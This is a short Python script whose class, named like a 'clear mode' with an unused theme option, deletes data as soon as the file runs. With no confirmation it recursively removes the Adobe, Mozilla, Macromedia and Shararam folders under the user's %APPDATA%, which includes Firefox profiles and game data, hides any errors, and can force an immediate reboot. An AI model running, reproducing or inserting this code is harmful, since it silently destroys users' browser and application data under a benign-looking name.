from os import getenv, walk, system
from shutil import rmtree


class ClearMode_Run:
    def __init__(self, theam='light', reboot=False):
        if reboot:
            self.ClearAppdata()  # Чистим %appdata%
            # Перезагружаем компьютер
            try:
                system('shutdown -t 0 -r -f')
            except Exception as error:
                print(error)


    def ClearAppdata(self):
        appdata = getenv('APPDATA')

        for path, dirnames, filenames in walk(appdata):
            dir = path.split('\\')[-1].lower()
            if dir in ('adobe', 'mozilla', 'macromedia', 'shararam'):
                try:
                    rmtree(path)
                except:
                    pass


Run = ClearMode_Run()
Run.ClearAppdata()
